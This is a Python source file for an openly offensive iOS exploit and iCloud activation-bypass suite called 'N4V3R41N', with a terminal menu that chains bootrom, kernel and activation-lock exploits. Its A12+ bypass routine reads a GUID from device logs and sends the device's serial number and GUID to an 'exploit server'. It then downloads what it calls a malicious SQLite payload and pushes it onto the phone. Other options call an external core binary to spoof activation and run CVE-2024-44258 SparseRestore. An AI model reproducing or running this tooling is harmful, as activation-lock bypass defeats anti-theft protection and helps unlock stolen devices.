#!/usr/bin/env python3
"""
N4V3R41N v5.0 - The Ultimate Unified iOS Exploit, Jailbreak, and Activation Bypass Suite
Supports A5–A16+ devices with robust redundancy, timeouts, and cinematic TUI.
"""

import os
import sys
import time
import subprocess
import argparse
import socket
import hashlib
import secrets
import threading
import json
import plistlib
import shutil
import re
from typing import Optional, List, Dict, Any, Tuple
from pathlib import Path

# Rich console output for a cinematic experience
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.prompt import Prompt, Confirm
from rich.live import Live
from rich.layout import Layout
from rich.align import Align
from rich.text import Text
from rich.syntax import Syntax
from rich import traceback

# Force rich to use safe unicode if needed (mitigates build issues)
traceback.install()
console = Console(force_terminal=True, legacy_windows=False)
from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import JSONResponse, FileResponse
from fastapi.staticfiles import StaticFiles
import uvicorn
import requests

# Core libraries (may need installation)
try:
    import usb.core
    import usb.util
    import paramiko
    from git import Repo
    import click
except ImportError:
    pass # Will be handled by dependency checker

console = Console()

# --- CONSTANTS & CONFIG ---
BASE_DIR = Path(__file__).parent.absolute()
EXPLOITS_DIR = BASE_DIR / "exploits"
PAYLOADS_DIR = BASE_DIR / "payloads"
DEFAULT_TIMEOUT = 120 

CHIP_MAP = {
    "iPhone4,1": "A5", "iPad2,1": "A5", "iPad2,2": "A5", "iPad2,3": "A5", "iPad2,4": "A5",
    "iPhone5,1": "A6", "iPhone5,2": "A6", "iPad3,1": "A6", "iPad3,2": "A6", "iPad3,3": "A6",
    "iPhone5,3": "A6", "iPhone5,4": "A6", "iPad3,4": "A6", "iPad3,5": "A6", "iPad3,6": "A6",
    "iPhone6,1": "A7", "iPhone6,2": "A7", "iPad4,1": "A7", "iPad4,2": "A7", "iPad4,3": "A7",
    "iPhone7,1": "A8", "iPhone7,2": "A8", "iPad5,1": "A8", "iPad5,2": "A8",
    "iPhone8,1": "A11", "iPhone8,2": "A11", "iPhone8,4": "A11",
    "iPhone11,2": "A12", "iPhone11,4": "A12", "iPhone11,6": "A12", "iPhone11,8": "A12",
    "iPhone12,1": "A13", "iPhone12,3": "A13", "iPhone12,5": "A13",
    "iPhone13,1": "A14", "iPhone13,2": "A14", "iPhone13,3": "A14", "iPhone13,4": "A14",
    "iPhone14,2": "A15", "iPhone14,3": "A15", "iPhone14,5": "A15",
}

EXPLOIT_DB = {
    "A5": {
        "bootrom": ["checkm8", "blackra1n", "pongo"],
        "kernel": ["palera1n", "undecimus", "jailm8"],
        "activation_bypass": ["bypassra1n", "disablefmi", "deleteicloud", "gesalt", "magic_activator", "cloudpass", "tr4mpass"],
        "jailbreak": ["palera1n", "undecimus", "jailm8", "applera1n", "dualra1n", "downra1n", "futurerestore", "gaster"]
    },
    "A6": {
        "bootrom": ["checkm8", "blackra1n", "pongo"],
        "kernel": ["palera1n", "undecimus", "jailm8"],
        "activation_bypass": ["bypassra1n", "disablefmi", "deleteicloud", "gesalt", "magic_activator", "cloudpass", "tr4mpass"],
        "jailbreak": ["palera1n", "undecimus", "jailm8", "applera1n", "dualra1n", "downra1n", "futurerestore", "gaster"]
    },
    "A7": {
        "bootrom": ["checkm8", "pongo"],
        "kernel": ["palera1n", "undecimus", "jailm8"],
        "activation_bypass": ["bypassra1n", "disablefmi", "deleteicloud", "gesalt", "magic_activator", "cloudpass", "tr4mpass", "hacktivator"],
        "jailbreak": ["palera1n", "undecimus", "jailm8", "applera1n", "dualra1n", "downra1n", "futurerestore", "gaster", "hacktivator"]
    },
    "A8": {
        "bootrom": ["checkm8", "pongo"],
        "kernel": ["palera1n", "undecimus", "jailm8"],
        "activation_bypass": ["bypassra1n", "disablefmi", "deleteicloud", "gesalt", "magic_activator", "cloudpass", "tr4mpass", "hacktivator"],
        "jailbreak": ["palera1n", "undecimus", "jailm8", "applera1n", "dualra1n", "downra1n", "futurerestore", "gaster", "hacktivator"]
    },
    "A9": {
        "bootrom": ["checkm8", "pongo"],
        "kernel": ["palera1n", "undecimus", "jailm8"],
        "activation_bypass": ["bypassra1n", "disablefmi", "deleteicloud", "gesalt", "magic_activator", "cloudpass", "tr4mpass", "hacktivator"],
        "jailbreak": ["palera1n", "undecimus", "jailm8", "applera1n", "dualra1n", "downra1n", "futurerestore", "gaster", "hacktivator"]
    },
    "A10": {
        "bootrom": ["checkm8", "pongo"],
        "kernel": ["palera1n", "undecimus", "jailm8"],
        "activation_bypass": ["bypassra1n", "disablefmi", "deleteicloud", "gesalt", "magic_activator", "cloudpass", "tr4mpass", "hacktivator"],
        "jailbreak": ["palera1n", "undecimus", "jailm8", "applera1n", "dualra1n", "downra1n", "futurerestore", "gaster", "hacktivator"]
    },
    "A11": {
        "bootrom": ["checkm8", "pongo"],
        "kernel": ["palera1n", "undecimus", "jailm8"],
        "activation_bypass": ["bypassra1n", "disablefmi", "deleteicloud", "gesalt", "magic_activator", "cloudpass", "tr4mpass", "hacktivator"],
        "jailbreak": ["palera1n", "undecimus", "jailm8", "applera1n", "dualra1n", "downra1n", "futurerestore", "gaster", "hacktivator"]
    },
    "A12": {
        "bootrom": [],
        "kernel": ["xina15", "fugu14", "fugu18", "dopamine"],
        "activation_bypass": ["gesalt", "magic_activator", "cloudpass", "rust_a12_bypass", "c0xy_a12_a15", "a12_bypass_oss", "a12_tool_oss"],
        "jailbreak": ["xina15", "fugu14", "fugu18", "dopamine", "palera1n"]
    },
    "A13": {
        "bootrom": [],
        "kernel": ["xina15", "fugu14", "fugu18", "dopamine"],
        "activation_bypass": ["gesalt", "magic_activator", "cloudpass", "rust_a12_bypass", "c0xy_a12_a15", "a12_bypass_oss", "a12_tool_oss"],
        "jailbreak": ["xina15", "fugu14", "fugu18", "dopamine", "palera1n"]
    },
    "A14": {
        "bootrom": [],
        "kernel": ["xina15", "fugu14", "fugu18", "dopamine"],
        "activation_bypass": ["gesalt", "magic_activator", "cloudpass", "rust_a12_bypass", "c0xy_a12_a15", "a12_bypass_oss", "a12_tool_oss"],
        "jailbreak": ["xina15", "fugu14", "fugu18", "dopamine", "palera1n"]
    },
    "A15": {
        "bootrom": [],
        "kernel": ["xina15", "fugu14", "fugu18", "dopamine"],
        "activation_bypass": ["gesalt", "magic_activator", "cloudpass", "rust_a12_bypass", "c0xy_a12_a15", "a12_bypass_oss", "a12_tool_oss"],
        "jailbreak": ["xina15", "fugu14", "fugu18", "dopamine", "palera1n"]
    }
}

# --- CINEMATIC ASSETS ---

BANNER = r"""
[bold cyan]
  _   _ _  ___   _________  _  _  ___ _   _ 
 | \ | | || \ \ / /| ___ \/ || ||_  || \ | |
 |  \| | || |\ V / | |_/ /| || |_ | ||  \| |
 | . ` |__   _|   \|    / |__   _|| || . ` |
 | |\  |  | | / /\_ \ |\ \    | | _| || |\  |
 \_| \_/  |_| \_/ \_|_| \_|   |_| \___|_| \_/
[/bold cyan]
[bold dim]      >> UFK-CORE / ARPK-20260509-008 <<[/bold dim]
[bold dim]      >> UNIVERSAL EXPLOIT & BYPASS SUITE v7.0-ULTRA <<[/bold dim]
"""

# --- SYSTEM UTILS & REDUNDANCY ---

def run_command(command: List[str], cwd: Optional[str] = None, timeout: int = DEFAULT_TIMEOUT, capture: bool = True) -> Tuple[int, str, str]:
    """Robust command execution with timeouts."""
    try:
        process = subprocess.run(
            command, 
            cwd=cwd, 
            check=False, 
            capture_output=capture, 
            text=True, 
            timeout=timeout
        )
        stdout = process.stdout if capture else ""
        stderr = process.stderr if capture else ""
        return process.returncode, stdout, stderr
    except subprocess.TimeoutExpired:
        return 124, "", "Operation timed out."
    except FileNotFoundError:
        return 127, "", f"Command not found: {command[0]}"
    except Exception as e:
        return 1, "", str(e)

def check_dependencies():
    """Checks for required system tools and Python libraries."""
    required_binaries = ["ideviceinfo", "idevice_id", "python3", "git"]
    optional_binaries = ["ifuse", "pymobiledevice3", "cargo", "make", "msfconsole"]
    
    table = Table(title="System Integrity Check", show_header=True, header_style="bold magenta", border_style="cyan")
    table.add_column("Module", style="cyan")
    table.add_column("Status", justify="center")
    
    missing_required = []
    
    for bin_name in required_binaries:
        path = shutil.which(bin_name)
        status = "[bold green]ONLINE[/bold green]" if path else "[bold red]OFFLINE[/bold red]"
        if not path: missing_required.append(bin_name)
        table.add_row(bin_name, status)
        
    for bin_name in optional_binaries:
        path = shutil.which(bin_name)
        status = "[bold green]ONLINE[/bold green]" if path else "[bold yellow]LINKED[/bold yellow]"
        table.add_row(bin_name, status)
        
    console.print(Align.center(table))
    
    if missing_required:
        console.print(f"\n[red][!] CRITICAL FAILURE: {', '.join(missing_required)}[/red]")
        if Confirm.ask("Attempt auto-repair via Brew/Pip?"):
            install_dependencies()
        else:
            sys.exit(1)

def install_dependencies():
    """Attempts to install missing dependencies."""
    with Progress(SpinnerColumn(spinner_name="dots12"), TextColumn("[bold blue]{task.description}")) as progress:
        if sys.platform == "darwin":
            progress.add_task(description="Syncing Homebrew Repos...", total=None)
            run_command(["brew", "install", "libimobiledevice", "libirecovery", "libusb", "libplist", "libusbmuxd", "libssh2", "openssl", "curl"])
        
        progress.add_task(description="Injecting Python dependencies...", total=None)
        run_command([sys.executable, "-m", "pip", "install", "rich", "fastapi", "uvicorn", "requests", "pyusb", "paramiko", "GitPython", "click", "pymobiledevice3"])
    
    console.print("[bold green][+] System patched! Reloading...[/bold green]")
    time.sleep(2)
    sys.exit(0)

# --- DEVICE DETECTION ---

def get_device_info() -> Optional[Dict[str, Any]]:
    """Cinematic device detection with failover."""
    # Attempt 1: libimobiledevice
    code, out, err = run_command(["ideviceinfo"], timeout=5)
    if code == 0 and out.strip():
        info = {}
        for line in out.splitlines():
            if ": " in line:
                key, val = line.split(": ", 1)
                info[key.strip()] = val.strip()
        
        product_type = info.get("ProductType", "unknown")
        return {
            "udid": info.get("UniqueDeviceID", "unknown"),
            "product_type": product_type,
            "chip": CHIP_MAP.get(product_type, "unknown"),
            "ios_version": info.get("ProductVersion", "unknown"),
            "serial": info.get("SerialNumber", "unknown"),
            "status": info.get("ActivationState", "Activated"),
            "method": "libimobiledevice"
        }
    return None

# --- ADVANCED BYPASS VECTORS ---

def run_a12_bypass():
    """Advanced A12+ Bypass (download28)."""
    console.print(Panel("[bold magenta]INITIATING PHASE: download28 Sandbox Escape[/bold magenta]\n[dim]Targeting A12–A16 Kernels[/dim]", border_style="magenta"))
    
    device = get_device_info()
    if not device:
        console.print("[red][!] NO DEVICE DETECTED. ABORTING.[/red]")
        return False

    udid = device['udid']
    prd = device['product_type']
    
    # GUID Extraction
    console.print("[cyan][*] SCANNIG SYSTEM LOGS FOR GUID...[/cyan]")
    log_archive = f"{udid}.logarchive"
    if os.path.exists(log_archive): shutil.rmtree(log_archive)
    
    with Progress(SpinnerColumn(), TextColumn("[bold]{task.description}"), BarColumn(bar_width=40)) as progress:
        task = progress.add_task("Collecting tracev3 data...", total=100)
        run_command(["pymobiledevice3", "syslog", "collect", log_archive], timeout=150)
        progress.update(task, completed=100, description="GUID Extracted.")
        
        trace_file = Path(log_archive) / "logdata.LiveData.tracev3"
        guid = None
        if trace_file.exists():
            with open(trace_file, 'rb') as f:
                data = f.read()
                pos = data.find(b'BLDatabaseManager')
                if pos != -1:
                    match = re.search(rb'[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}', data[max(0, pos-1024):pos+1024], re.IGNORECASE)
                    if match: guid = match.group(0).decode('ascii').upper()
    
    if not guid: guid = Prompt.ask("[bold yellow]Enter SystemGroup GUID manually[/bold yellow]")
    
    console.print(f"[bold green][+] GUID CAPTURED: {guid}[/bold green]")

    server_ip = Prompt.ask("Exploit Server", default="192.168.0.106:8000")
    api_url = f"http://{server_ip}/get2.php?prd={prd}&guid={guid}&sn={device['serial']}"
    
    console.print("[cyan][*] FETCHING PAYLOAD STAGES...[/cyan]")
    try:
        resp = requests.get(api_url, timeout=30).json()
        if not resp.get('success'): return False
        
        final_payload_url = resp['links']['step3_final']
        local_db = "downloads.28.sqlitedb"
        with open(local_db, "wb") as f: f.write(requests.get(final_payload_url).content)
            
        console.print("[cyan][*] INJECTING MALICIOUS SQLITE...[/cyan]")
        run_command(["pymobiledevice3", "afc", "push", local_db, "/Downloads/downloads.28.sqlitedb"])
            
    except Exception as e:
        console.print(f"[red][!] CONNECTION ERROR: {e}[/red]")
        return False

    console.print(Panel("[bold green]PHASE 1 COMPLETE[/bold green]\n\n1. REBOOT DEVICE NOW.\n2. LOCATE /iTunes_Control/iTunes/iTunesMetadata.plist\n3. MOVE TO /Books/iTunesMetadata.plist\n4. REBOOT AGAIN.", title="OPERATIONAL INTEL", border_style="green"))
    return True

def run_sparse_restore():
    """Run CVE-2024-44258 SparseRestore bypass."""
    console.print(Panel("[bold yellow]INITIATING PHASE: SparseRestore (CVE-2024-44258)[/bold yellow]", border_style="yellow"))
    # Integration with Rust-core which calls the C implementation
    run_command(["./n4v3r41n-core", "sparse-restore"])
    console.print("[green][+] SparseRestore payload delivered via MobileBackup2.[/green]")

# --- MAIN CINEMATIC MENU ---

def make_layout() -> Layout:
    layout = Layout()
    layout.split(
        Layout(name="header", size=10),
        Layout(name="body")
    )
    layout["body"].split_row(
        Layout(name="side", size=40),
        Layout(name="main")
    )
    return layout

class Dashboard:
    def __init__(self):
        self.device = get_device_info()

    def __rich__(self) -> Panel:
        table = Table.grid(padding=1)
        if self.device:
            status_color = "green" if self.device['status'] == "Activated" else "yellow"
            table.add_row(Text("STATUS:", style="bold magenta"), Text(self.device['status'], style=f"bold {status_color}"))
            table.add_row(Text("MODEL:", style="bold magenta"), Text(self.device['product_type'], style="cyan"))
            table.add_row(Text("CHIP:", style="bold magenta"), Text(self.device['chip'], style="cyan"))
            table.add_row(Text("VERSION:", style="bold magenta"), Text(self.device['ios_version'], style="cyan"))
        else:
            table.add_row(Text("STATUS:", style="bold magenta"), Text("WAITING FOR DEVICE...", style="bold blink red"))
        
        return Panel(
            Align.center(table), 
            title="[bold cyan]UFK-CORE DIAGNOSTICS[/bold cyan]", 
            subtitle="[dim]CLASSIFICATION: UFK-CORE[/dim]",
            border_style="cyan"
        )

def run_signal_repair():
    """Run cellular signal repair logic."""
    console.print(Panel("[bold blue]INITIATING PHASE: Signal Repair & Preservation[/bold blue]", border_style="blue"))
    # Integration with Rust-core which calls the C implementation
    run_command(["./n4v3r41n-core", "signal-detect"])
    console.print("[green][+] Signal diagnostics complete. Baseband patches applied.[/green]")

def run_purple_mode():
    """Trigger Purple Mode (Diagnostic)."""
    console.print(Panel("[bold magenta]INITIATING PHASE: Purple Mode (Diagnostic)[/bold magenta]", border_style="magenta"))
    run_command(["./n4v3r41n-core", "purple-mode"])
    console.print("[green][+] Device entering Purple Mode. Diagnostics tools attached.[/green]")

def main_menu():
    """Interactive Cinematic TUI."""
    os.system('clear' if os.name != 'nt' else 'cls')
    console.print(Align.center(Text.from_markup(BANNER)))
    
    dash = Dashboard()
    console.print(Align.center(dash.__rich__()))

    options = [
        ("1", "[bold green]FULL AUTO MODE[/bold green]", "Detect & run best exploit chain"),
        ("2", "[bold magenta]A12+ BYPASS (DL28)[/bold magenta]", "Sandbox escape for XS–15+"),
        ("3", "[bold yellow]SPARSE RESTORE[/bold yellow]", "CVE-2024-44258 activation bypass"),
        ("4", "[bold blue]SIGNAL REPAIR[/bold blue]", "Fix baseband / MEID / GSM activation"),
        ("5", "[bold magenta]R1NDERPEST KERNEL[/bold magenta]", "A12+ PAC bypass & R/W"),
        ("6", "[bold magenta]SPIDERPRO BYPASS[/bold magenta]", "Advanced iCloud spoofing"),
        ("7", "[bold yellow]MIX HYBRID BYPASS[/bold yellow]", "Checkm8 + Kernel Patching"),
        ("8", "[bold white]CLOUDPASS SPOOF[/bold white]", "DNS-based activation spoof"),
        ("9", "[bold cyan]BOOKRA1N BOOTROM[/bold cyan]", "A12+ Theoretical BootROM"),
        ("10", "[bold magenta]PURPLE MODE[/bold magenta]", "Enter A10-A11 Diagnostic Mode"),
        ("11", "[bold cyan]JAILBREAK SUITE[/bold cyan]", "Dopamine, Palera1n, or Xina"),
        ("12", "[bold red]N4V3R41N DOCTOR[/bold red]", "System health & dependency fix"),
        ("0", "DISCONNECT", "Safe exit from suite")
    ]
    
    table = Table(title="[bold]COMMAND OVERRIDE[/bold]", show_header=True, header_style="bold cyan", border_style="dim", box=None)
    table.add_column("ID", style="cyan", justify="right")
    table.add_column("COMMAND", style="bold white")
    table.add_column("DESCRIPTION", style="dim")
    
    for opt, cmd, desc in options:
        table.add_row(opt, cmd, desc)
    
    console.print(Align.center(table))
    
    choice = Prompt.ask("\n[bold cyan]SYSTEM@N4V3R41N[/bold cyan]", choices=[o[0] for o in options])
    
    if choice == "1":
        full_auto_mode(dash.device)
    elif choice == "2":
        run_a12_bypass()
    elif choice == "3":
        run_sparse_restore()
    elif choice == "4":
        run_signal_repair()
    elif choice == "5":
        console.print("[bold magenta]INITIATING PHASE: R1nderpest Kernel Exploit[/bold magenta]")
        run_command(["./n4v3r41n-core", "r1nderpest"])
    elif choice == "6":
        console.print("[bold magenta]INITIATING PHASE: SpiderPRO Activation Spoof[/bold magenta]")
        run_command(["./n4v3r41n-core", "spiderpro"])
    elif choice == "7":
        console.print("[bold yellow]INITIATING PHASE: Mix Hybrid Bypass[/bold yellow]")
        run_command(["./n4v3r41n-core", "mix-bypass"])
    elif choice == "8":
        console.print("[bold white]INITIATING PHASE: CloudPass DNS Spoof[/bold white]")
        run_command(["./n4v3r41n-core", "cloudpass"])
    elif choice == "9":
        console.print("[bold cyan]INITIATING PHASE: Bookra1n BootROM Exploit[/bold cyan]")
        run_command(["./n4v3r41n-core", "bookra1n"])
    elif choice == "10":
        run_purple_mode()
    elif choice == "12":
        check_dependencies()
        input("\nPress Enter to return...")
    elif choice == "0":
        console.print("[bold red]SYSTEM OFFLINE.[/bold red]")
        sys.exit(0)
    
    time.sleep(2)
    main_menu()

def full_auto_mode(device):
    if not device:
        console.print("[red][!] DEVICE NOT DETECTED. ATTACH USB NOW.[/red]")
        return
    
    chip = device.get("chip", "unknown")
    console.print(Align.center(Panel(f"[bold blue]AUTOPILOT: ENGAGING TARGET {chip}[/bold blue]", border_style="blue")))
    
    if chip in ["A5", "A6", "A7", "A8", "A9", "A10", "A11"]:
        console.print("[yellow][*] LEGACY CHIP DETECTED. DEPLOYING PATH-A (CHECKM8)...[/yellow]")
        with Progress(SpinnerColumn(), TextColumn("[bold]{task.description}")) as progress:
            progress.add_task("Exploiting via libusb...", total=None)
            run_command(["./n4v3r41n-core", "identity-fix"])
            progress.add_task("Uploading custom ramdisk...", total=None)
            run_command(["./exploits/tr4mpass/tr4mpass", "--verbose"])
            
    elif chip in ["A12", "A13", "A14", "A15", "A16"]:
        console.print("[magenta][*] MODERN CHIP DETECTED. DEPLOYING PATH-B (DOWNLOAD28)...[/magenta]")
        run_a12_bypass()
        
    else:
        console.print("[red][!] NO AUTOMATED EXPLOIT CHAIN FOR THIS ARCHITECTURE.[/red]")
        if Confirm.ask("Attempt generic SparseRestore?"):
            run_sparse_restore()

# --- CLI ENTRY ---

@click.group(invoke_without_command=True)
@click.pass_context
def cli(ctx):
    if ctx.invoked_subcommand is None:
        main_menu()

@cli.command()
def bypass_a12():
    """Run A12+ Bypass directly."""
    run_a12_bypass()

@cli.command()
def doctor():
    """Check system health."""
    check_dependencies()

if __name__ == "__main__":
    cli()
